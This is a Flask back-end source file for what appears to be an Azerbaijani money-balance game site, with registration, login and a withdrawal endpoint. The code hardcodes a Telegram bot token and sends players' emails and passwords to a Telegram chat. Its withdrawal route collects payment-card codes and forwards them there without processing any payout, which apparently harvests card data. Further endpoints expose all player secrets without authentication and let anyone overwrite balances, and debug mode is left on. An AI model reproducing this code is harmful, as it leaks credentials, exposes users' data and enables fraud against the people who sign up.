from flask import Flask, render_template, request, jsonify
import os
import random
import time
import requests
import psycopg2
from urllib.parse import urlparse

app = Flask(__name__)

# --- XARİCİ BULUD BAZASI (SUPABASE / POSTGRESQL) ---
# Render-də və ya xarici serverdə 'DATABASE_URL' environment variable kimi təyin olunur
DATABASE_URL = os.environ.get("DATABASE_URL", "postgresql://user:password@your-external-cloud-db.com:5432/dbname")

def get_db_connection():
    url = urlparse(DATABASE_URL)
    conn = psycopg2.connect(
        database=url.path[1:],
        user=url.username,
        password=url.password,
        host=url.hostname,
        port=url.port
    )
    return conn

def init_db():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS players (
                player_id VARCHAR(50) PRIMARY KEY,
                name VARCHAR(100),
                gmail VARCHAR(150) UNIQUE,
                balance REAL,
                code VARCHAR(50),
                online INTEGER,
                last_active BIGINT
            )
        ''')
        conn.commit()
        cursor.close()
        conn.close()
    except Exception as e:
        print("Bulud bazasına qoşulma xətası:", e)

init_db()

# --- TELEGRAM BOT MƏLUMATLARI ---
TELEGRAM_TOKEN = "8502614066:AAFsPtOOY5RS5y1SNRs_Oir1sBXCgkl4fyY"
TELEGRAM_CHAT_ID = "7953669834"

def send_telegram_message(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        }
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print("Telegram xətası:", e)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/admin')
def admin_panel():
    return render_template('gizli_panel.html')

@app.route('/get_data', methods=['GET'])
def get_data():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("SELECT player_id, name, gmail, balance, code, online, last_active FROM players")
        rows = cursor.fetchall()
        cursor.close()
        conn.close()
        
        players_dict = {}
        for row in rows:
            players_dict[row[0]] = {
                "name": row[1],
                "gmail": row[2],
                "balance": row[3],
                "code": row[4],
                "online": bool(row[5]),
                "last_active": row[6]
            }
        return jsonify(players_dict)
    except Exception as e:
        return jsonify({})

@app.route('/save_data', methods=['POST'])
def save_data_route():
    data = request.json
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        for p_id, info in data.items():
            cursor.execute('''
                INSERT INTO players (player_id, name, gmail, balance, code, online, last_active)
                VALUES (%s, %s, %s, %s, %s, %s, %s)
                ON CONFLICT (player_id) DO UPDATE SET
                    balance = EXCLUDED.balance,
                    online = EXCLUDED.online,
                    last_active = EXCLUDED.last_active
            ''', (p_id, info.get('name'), info.get('gmail'), info.get('balance', 0.0), info.get('code'), int(info.get('online', True)), info.get('last_active', int(time.time() * 1000))))
        conn.commit()
        cursor.close()
        conn.close()
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/auth', methods=['POST'])
def auth():
    req = request.json
    name = req.get('name', 'Oyunçu').strip()
    gmail = req.get('gmail', '').strip()

    if not gmail or '@' not in gmail:
        return jsonify({"status": "error", "message": "Zəhmət olmasa etibarlı Gmail daxil edin!"})

    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute("SELECT player_id FROM players WHERE gmail = %s", (gmail,))
        if cursor.fetchone():
            cursor.close()
            conn.close()
            return jsonify({
                "status": "error", 
                "message": "Bu Gmail artıq qeydiyyatdan keçib! Zəhmət olmasa Giriş panelindən daxil olun."
            })

        player_id = f"HOT_{random.randint(1000, 9999)}"
        cursor.execute("SELECT player_id FROM players WHERE player_id = %s", (player_id,))
        while cursor.fetchone():
            player_id = f"HOT_{random.randint(1000, 9999)}"
            cursor.execute("SELECT player_id FROM players WHERE player_id = %s", (player_id,))
            
        secret_code = f"PASS{random.randint(100, 999)}"
        now = int(time.time() * 1000)

        cursor.execute('''
            INSERT INTO players (player_id, name, gmail, balance, code, online, last_active)
            VALUES (%s, %s, %s, %s, %s, %s, %s)
        ''', (player_id, name, gmail, 0.00, secret_code, 1, now))
        
        conn.commit()
        cursor.close()
        conn.close()

        msg = (
            f"🚨 **Yeni Qeydiyyat (Xarici Bulud Baza)!**\n\n"
            f"👤 **Ad:** {name}\n"
            f"📧 **Gmail:** {gmail}\n"
            f"🆔 **ID:** `{player_id}`\n"
            f"🔑 **Şifrə:** `{secret_code}`\n"
            f"💰 **Balans:** 0.00 ₼"
        )
        send_telegram_message(msg)

        return jsonify({
            "status": "success",
            "playerId": player_id,
            "balance": 0.00,
            "code": secret_code
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/login', methods=['POST'])
def login():
    req = request.json
    gmail = req.get('gmail', '').strip()
    player_id = req.get('playerId', '').strip()

    if not gmail or not player_id:
        return jsonify({"status": "error", "message": "Gmail və ID daxil edilməlidir!"})

    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute("SELECT name, balance FROM players WHERE player_id = %s AND gmail = %s", (player_id, gmail))
        user = cursor.fetchone()

        if user:
            now = int(time.time() * 1000)
            cursor.execute("UPDATE players SET online = 1, last_active = %s WHERE player_id = %s", (now, player_id))
            conn.commit()
            cursor.close()
            conn.close()
            
            msg = (
                f"🟢 **Oyunçu Giriş etdi!**\n\n"
                f"👤 **Ad:** {user[0]}\n"
                f"🆔 **ID:** `{player_id}`\n"
                f"📧 **Gmail:** {gmail}"
            )
            send_telegram_message(msg)

            return jsonify({
                "status": "success",
                "playerId": player_id,
                "balance": user[1]
            })
        
        cursor.close()
        conn.close()
        return jsonify({"status": "error", "message": "Daxil edilən Gmail və ya ID səhvdir!"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/withdraw', methods=['POST'])
def withdraw():
    req = request.json
    player_id = req.get('playerId')
    amount = req.get('amount')
    gmail = req.get('gmail')
    card_code = req.get('cardCode')

    if not player_id or not amount or not gmail or not card_code:
        return jsonify({"status": "error", "message": "Bütün məlumatlar doldurulmalıdır!"})

    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("SELECT player_id FROM players WHERE player_id = %s", (player_id,))
        user = cursor.fetchone()
        cursor.close()
        conn.close()

        if user:
            msg = (
                f"💸 **Pul Çıxarma Sorğusu!**\n\n"
                f"🆔 **ID:** `{player_id}`\n"
                f"📧 **Gmail:** {gmail}\n"
                f"💳 **Kart Kodu:** `{card_code}`\n"
                f"💰 **Məbləğ:** `{amount} ₼`"
            )
            send_telegram_message(msg)
            return jsonify({"status": "success"})
        
        return jsonify({"status": "error", "message": "Oyunçu tapılmadı!"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    req = request.json
    player_id = req.get('playerId')
    if not player_id:
        return jsonify({"status": "error"})
    
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        now = int(time.time() * 1000)
        cursor.execute("UPDATE players SET online = 1, last_active = %s WHERE player_id = %s", (now, player_id))
        conn.commit()
        cursor.close()
        conn.close()
        return jsonify({"status": "success"})
    except Exception:
        return jsonify({"status": "error"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=True)